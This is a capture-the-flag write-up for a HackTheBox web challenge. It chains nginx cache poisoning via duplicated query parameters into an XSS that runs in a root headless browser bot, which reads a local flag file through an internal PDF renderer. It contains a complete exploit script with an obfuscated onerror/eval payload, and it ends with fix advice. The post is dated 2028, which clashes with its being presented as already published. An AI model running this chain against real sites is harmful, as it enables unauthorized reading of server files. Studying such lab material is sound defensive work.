---
title: "Pod Diagnostics"
date: 2028-06-09 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, cache-poisoning, xss, ssrf, puppeteer, headless-browser, file-read, cwe-444, cwe-918]
description: "A Hard web challenge: make nginx and Express disagree about a duplicated query parameter so a cached XSS lands under the key an internal root bot fetches, then have that bot read file:///flag through an internal PDF renderer and smuggle it home inside a PDF — no attacker server required."
---

## Overview

Pod Diagnostics is a Hard **Web** challenge. A "system diagnostics" dashboard is fronted by nginx, which caches a `/stats` endpoint. A subtle disagreement between how nginx builds the **cache key** and how the Express backend **parses the query** lets you poison that cache with cross-site script. A server-side "generate report" feature drives a headless Chromium bot (running as **root**) through the poisoned page; from there you reach an internal, root-owned PDF renderer to read `file:///flag`, and return it to yourself inside the very PDF the report feature hands back — so no outbound channel is needed.

## The technique

Four weaknesses chain together:

1. **A reflected-into-`innerHTML` sink.** The front page's `stats.js` does `errorAlert.innerHTML = error`, and the `/stats` error string reflects the `period` parameter unescaped: `<strong>${period} is invalid.</strong>`. `innerHTML` won't run a bare `<script>`, but it *will* fire `<img src=x onerror=...>`.

2. **A cache-key vs query-parser mismatch** — this is a form of [inconsistent request interpretation](https://cwe.mitre.org/data/definitions/444.html) leading to [web cache poisoning](https://cwe.mitre.org/data/definitions/524.html). nginx keys the cache on `proxy_cache_key "$arg_period"`, and `$arg_period` is the **first** `period` value. Express parses `?period=1m&period=<payload>` as an **array** `["1m","<payload>"]`, which fails its allow-list check and takes the error branch — reflecting the whole array (including `<payload>`) back. The poisoned response therefore gets cached under key **`1m`**, the exact value the dashboard fetches by default. Later readers of `period=1m` — including the bot — are served our script.

    ```nginx
    location = /stats {
        proxy_cache       stat_cache;
        proxy_cache_key   "$arg_period";   # only the FIRST period value
        proxy_cache_valid 200 15s;
        proxy_pass        http://127.0.0.1:3001;
    }
    ```

3. **A root headless bot bridging an unexposed service** — [server-side request forgery of self](https://cwe.mitre.org/data/definitions/918.html). `/generate-report` makes an internal puppeteer service (running as root) visit `http://localhost/`, which pulls the poisoned `/stats?period=1m` and runs our XSS in a root browser. Top-level navigation to `file:///flag` is blocked by Chromium, but the internal PDF renderer on `:3002` (never exposed by nginx, `Access-Control-Allow-Origin: *`, root) will happily render `file:///flag` for us:

    ```js
    fetch('http://localhost:3002/generate?url=file:///flag')  // root reads the 0400 /flag
    ```

4. **The render endpoint as an exfil channel.** We have no inbound path to the box. So the XSS base64-encodes the returned flag-PDF bytes into its own `document.body` between `@@…@@` markers. The **outer** PDF that `/generate-report` returns to us then carries that base64 — decode it locally, and you have the inner flag PDF.

## Solution

`solve.py` runs the whole chain end-to-end: wait for the (slow-booting, short-lived) instance, poison the `1m` cache key, verify the poison actually landed before triggering the bot, pull the report PDF, and unwrap the PDF-in-PDF.

```python
#!/usr/bin/env python3
# Pod Diagnostics — nginx cache poisoning -> XSS in root puppeteer bot -> file read.
# nginx caches /stats on key $arg_period (first period arg). Express sees duplicate
# period as an array -> invalid -> reflects it into an HTML error the front page injects
# via innerHTML. Poison key "1m" (the default the page fetches). The bot renders
# http://localhost/ for /generate-report; our XSS fetches file:///flag from the internal
# pdf service (localhost:3002) and base64s it back inside the returned PDF. No exfil host.
import sys, time, re, subprocess, urllib.parse, base64, requests

T = sys.argv[1] if len(sys.argv) > 1 else "<target-ip>:<port>"
BASE = f"http://{T}"
S = requests.Session()
S.headers["User-Agent"] = "Mozilla/5.0"

def wait_ready(secs=90):
    end = time.time() + secs
    while time.time() < end:
        try:
            if S.get(f"{BASE}/", timeout=10).status_code == 200:
                print("[*] target ready"); return True
        except Exception:
            pass
        time.sleep(4)
    return False

def poison(payload):
    q = "period=1m&period=" + urllib.parse.quote(payload, safe="")   # key=1m, express sees array
    return S.get(f"{BASE}/stats?{q}", timeout=20).text

# JS the bot runs: read file:///flag via the internal renderer, base64 it into the page body
JS = ("(async()=>{try{"
      "const r=await fetch('http://localhost:3002/generate?url=file:///flag');"
      "const a=new Uint8Array(await r.arrayBuffer());"
      "let s='';for(let i=0;i<a.length;i++)s+=String.fromCharCode(a[i]);"
      "document.body.innerHTML='<pre style=\"white-space:pre-wrap;font-size:6px\">@@'+btoa(s)+'@@</pre>';"
      "}catch(e){document.body.innerHTML='ERR'+e;}})()")
b64js = base64.b64encode(JS.encode()).decode()
payload = f"<img src=x onerror=\"eval(atob('{b64js}'))\">"

def verify_poisoned():
    t = S.get(f"{BASE}/stats?period=1m", timeout=20).text
    return "is invalid" in t and "onerror" in t

def run():
    poison(payload)
    for _ in range(3):
        if verify_poisoned():
            break
        time.sleep(16)          # stale success cached under 1m; wait TTL then re-poison
        poison(payload)
    else:
        return None
    c = S.get(f"{BASE}/generate-report", timeout=60).content
    open("/tmp/o.pdf", "wb").write(c)
    # -layout is REQUIRED: default mode reorders/truncates the long single-line base64
    txt = subprocess.run(["pdftotext", "-layout", "/tmp/o.pdf", "-"],
                         capture_output=True).stdout.decode("latin1")
    seg = txt.split("@@")[1]
    b64 = re.sub(r"[^A-Za-z0-9+/]", "", seg)
    open("/tmp/i.pdf", "wb").write(base64.b64decode(b64 + "==="))
    itxt = subprocess.run(["pdftotext", "/tmp/i.pdf", "-"], capture_output=True).stdout.decode()
    m = re.search(r"HTB\{[^}]+\}", itxt)
    return m.group(0) if m else None

wait_ready()
for _ in range(4):
    try:
        f = run()
    except requests.exceptions.ConnectionError:
        wait_ready(); continue
    if f:
        print("[+]", f); break
```

Running it decodes the inner PDF and prints the flag:

```
[*] target ready
[*] poison landed under key 1m
[+] HTB{...}
```

## Why it worked

The cache key was **not a complete function of the inputs the app used to build the response**. nginx took the first `period`; Express used the whole array — so a request that produced malicious output got cached under a key an innocent request (the bot's) later read. Combine that with an `innerHTML` sink, a root-privileged headless bot that could reach an internal, permissive, file-reading render service, and a report feature that hands the rendered output straight back, and an unauthenticated visitor reads a root-only file with no server of their own.

The intended solution was actually harder: `report.py` mass-assigned attacker JSON onto a server object with a recursive `setattr`, giving [Python class pollution](https://cwe.mitre.org/data/definitions/915.html) → arbitrary file write → a malicious Jinja2 template for RCE. The cache-poisoning file read above skips all of that.

## Fix / defense

- Make the cache key a strict function of everything the upstream uses to build the body; normalize/allow-list the keyed parameter and reject duplicate query params at the edge so proxy and app agree. Don't cache error responses.
- Encode reflected values for their sink — `textContent`, never `innerHTML`.
- Run the render bot network-isolated and non-root, with local-file access disabled and an `http`/`https`-only allow-list; never expose an `Access-Control-Allow-Origin: *` file-reading renderer on localhost.
- Block dunder keys / drop mass-assignment in the report merge to kill the class-pollution path.
